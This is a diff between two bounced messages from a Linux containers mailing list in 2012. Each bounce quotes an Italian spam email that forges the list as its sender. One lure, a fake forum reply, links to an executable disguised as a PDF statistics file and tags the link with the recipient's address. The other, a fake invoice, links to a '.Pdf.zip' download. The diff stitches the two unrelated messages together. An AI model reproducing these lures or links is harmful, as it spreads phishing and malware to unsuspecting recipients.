@@ -1,10 +1,9 @@
-From: Mail Delivery System <Mailer-Daemon-1Eyii/g6PjDovCESwdSfyoRWq/SkRNHw@public.gmane.org>
-Subject: Mail delivery failed: returning message to sender
-Date: Wed, 17 Oct 2012 14:02:33 +0200
-Message-ID: <E1TOSKX-0001x4-80@node4.mailshover.nl>
+From: MAILER-DAEMON-nH/gLuHjk3BCUW14vc7fK16hYfS7NtTn@public.gmane.org (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+Date: Wed, 17 Oct 2012 13:53:41 +0200 (CEST)
+Message-ID: <20121017115341.C176F13FD6@caacanapa.icoa.it>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============2002077228962826028=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -18,62 +17,105 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This message was created automatically by mail delivery software.
+This is a MIME-encapsulated message.
 
-A message that you sent could not be delivered to one or more of its
-recipients. This is a permanent error. The following address(es) failed:
+--===============2002077228962826028==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="5A80B13FAD.1350474821/caacanapa.icoa.it"
+Content-Transfer-Encoding: 7bit
 
-  foxtronik-KGm45+8e4WzOeuqD6ShaSA@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<foxtronik-KGm45+8e4WzOeuqD6ShaSA@public.gmane.org>:
-    host etb-2.mail.tiscali.it [213.205.33.62]: 550 5.1.1 <foxtronik-IWqWACnzNjyonA0d6jMUrA@public.gmane.org> recipient overquota
+This is a MIME-encapsulated message.
 
------- This is a copy of the message, including all the headers. ------
+--5A80B13FAD.1350474821/caacanapa.icoa.it
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
 
-Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: from smtp-c1n2.argewebhosting.nl ([194.165.34.59] helo=smtp-c1n2-2.argewebhosting.nl)
-	by node4.mailshover.nl with esmtps (TLSv1:DHE-RSA-AES256-SHA:256)
-	(Exim 4.80)
-	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
-	id 1TOSJz-0001s0-4o
-	for foxtronik-KGm45+8e4WzOeuqD6ShaSA@public.gmane.org; Wed, 17 Oct 2012 14:02:17 +0200
-Received: from localhost.localdomain (colossus156.startdedicated.com [69.64.42.16])
-	(Authenticated sender: bestellen-kfQ1KiJx39iKbIKAclkrbw@public.gmane.org)
-	by smtp-c1n2-2.argewebhosting.nl (Postfix) with ESMTPA id 25A426EB085
-	for <foxtronik-KGm45+8e4WzOeuqD6ShaSA@public.gmane.org>; Wed, 17 Oct 2012 13:55:59 +0200 (CEST)
-Received: from [69.64.42.16] by localhost.localdomain id IZHD0aeTHpH; Wed, 17 Oct 2012 13:55:58 +0200
-Message-ID: <00be01cdac5e$549b9c80$01000a0a-bi+AKbBUZKY6gyzm1THtWbp2dZbC/Bob@public.gmane.org>
-From: "Bona" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <foxtronik-KGm45+8e4WzOeuqD6ShaSA@public.gmane.org>
-Subject: Fwd: Risposta dal forum.
-Date: Wed, 17 Oct 2012 13:55:58 +0200
+This is the mail system at host caacanapa.icoa.it.
+
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
+
+For further assistance, please send mail to postmaster.
+
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
+
+                   The mail system
+
+<info-7YqIV/F9cxES+FvcfC7Uqw@public.gmane.org>: Host or domain name not found. Name service error for
+    name=studioldl.com type=A: Host not found
+
+--5A80B13FAD.1350474821/caacanapa.icoa.it
+Content-Description: Delivery report
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns; caacanapa.icoa.it
+X-Postfix-Queue-ID: 5A80B13FAD
+X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Arrival-Date: Wed, 17 Oct 2012 13:53:41 +0200 (CEST)
+
+Final-Recipient: rfc822; info-7YqIV/F9cxES+FvcfC7Uqw@public.gmane.org
+Original-Recipient: rfc822;info-7YqIV/F9cxES+FvcfC7Uqw@public.gmane.org
+Action: failed
+Status: 5.4.4
+Diagnostic-Code: X-Postfix; Host or domain name not found. Name service error
+    for name=studioldl.com type=A: Host not found
+
+--5A80B13FAD.1350474821/caacanapa.icoa.it
+Content-Description: Undelivered Message
+Content-Type: message/rfc822
+Content-Transfer-Encoding: 7bit
+
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from localhost (localhost [127.0.0.1])
+	by caacanapa.icoa.it (Postfix) with ESMTP id 5A80B13FAD
+	for <info-7YqIV/F9cxES+FvcfC7Uqw@public.gmane.org>; Wed, 17 Oct 2012 13:53:41 +0200 (CEST)
+X-Virus-Scanned: Debian amavisd-new at caacanapa.icoa.it
+Received: from caacanapa.icoa.it ([127.0.0.1])
+	by localhost (caacanapa.icoa.it [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id NTMWrdkuHI7q for <info-7YqIV/F9cxES+FvcfC7Uqw@public.gmane.org>;
+	Wed, 17 Oct 2012 13:53:40 +0200 (CEST)
+Received: from node01.qikbuddy.com (node01.qikbuddy.com [96.127.147.98])
+	(Authenticated sender: lerino-nH/gLuHjk3AL5bzFcGmneg@public.gmane.org)
+	by caacanapa.icoa.it (Postfix) with ESMTPA id 8932E13F98
+	for <info-7YqIV/F9cxES+FvcfC7Uqw@public.gmane.org>; Wed, 17 Oct 2012 13:53:40 +0200 (CEST)
+Received: from [96.127.147.98] by node01.qikbuddy.com id wN6D3PvgTKqP with SMTP; Wed, 17 Oct 2012 06:53:40 -0500
+Date: Wed, 17 Oct 2012 06:53:40 -0500
+From: "Consult2 " <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v3.07.2) Home
+X-Priority: 3 (Normal)
+Message-ID: <665878282.63657777174503-kG2WO9oPmd+Egh9BgeAcz0EOCMrvLtNR@public.gmane.org>
+To: <info-7YqIV/F9cxES+FvcfC7Uqw@public.gmane.org>
+Subject: fattura
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
-Content-Transfer-Encoding: 8bit
-X-Filter-ID: XtLePq6GTMn8G68F0EmQvUy1TURgLZGtBlbqxVOMnQqc4b7EDSoutnKmFnlPKsIWoQfc5HpZrgOD
- EEgYVScsdlQW70n9oKSh0gu+5OcZDwdrzdRvHEg8d1uiffdQTAQQb5XFLVueSxzCrt/tGDdn6SuV
- UhDaRHl5s0I08qARmiACi0dw2/Sw4OZb67ceGjT20ZHKIjqMUf+f1DwJfekoicPqjKk3nWOkhR1r
- ViA0gmefRW2tkXttp2wIKEVM9FFt9UXkIOJUTcIjbYjn4pHVRvYYCikUkpPSswsM0Ksj+/qOl8ZX
- 0mzMU7+xd7bDwSXl4E5R2V3ncKtfVWplgdLp3nQjuRSQmu5preHjZg0bWgOSj9RFrRLZyHf91EGO
- tM7D771qFXFZZN9LMTX55VDUyD22I91AlLit0XguIykqXwrV0KCwqXzUhSyxHudSBm6QXn+1CRvi
- M0pEtzhP+lX1jst3j8EwzJuUfTTIZV1TSTRQnuc0XvE58rlK6rbzgmyz/kNiQuECT/Xcg2CHdQjZ
- tX4cxrxpht8MgdoBqa9E4VjWTDgFMvQ1z1ewtfihy2SUASJFC/49WOPBr5nlEUI4xKmVG1dxzmJ+
- 544xSqfWSRJfzvCy12ody8yKElw/MNAr7i8dEoReyu1Fk5HkZ088yRvpLwzATKXSZ4q1KADJKVw=
-X-Originating-IP: 194.165.34.59
-X-MailShover-Domain: out.mailshover.nl
-X-MailShover-Username: 194.165.34.59
-Authentication-Results: mailshover.nl; auth=pass smtp.auth=194.165.34.59
-X-MailShover-Outgoing-Class: unsure
-X-MailShover-Outgoing-Evidence: Combined (0.36)
-X-Recommended-Action: accept
+Content-Transfer-Encoding: quoted-printable
+
+
+         =20
+Gentile utente, Monte Biz =20
+    =20
+Risposta dal forum.
+Statistiche finanziari si chiedono puo essere scaricato al seguente indir=
+izzo:
+http://ssklogatec.com/responderdownload/Operazione.Pdf.zip
+
+=3D=3D
+Tel./Fax.: (06) 234 12 94=20
 
 
 
-Buongiorno, 
-E stata attivata i messaggi di servizio di notifica dal forum.
-Lei ha chiesto informazioni sul profilo.
-Le statistiche possono essere scaricati al seguente indirizzo:
-http://taiseibijutsu.vn/responderdownload/Statistica.Pdf_php_stat.pdf_adobe.download.exe?account_id=foxtronik-KGm45+8e4WzOeuqD6ShaSA@public.gmane.org
+--5A80B13FAD.1350474821/caacanapa.icoa.it--
 
+--===============2002077228962826028==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-Q1oOcoKD7F
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============2002077228962826028==--
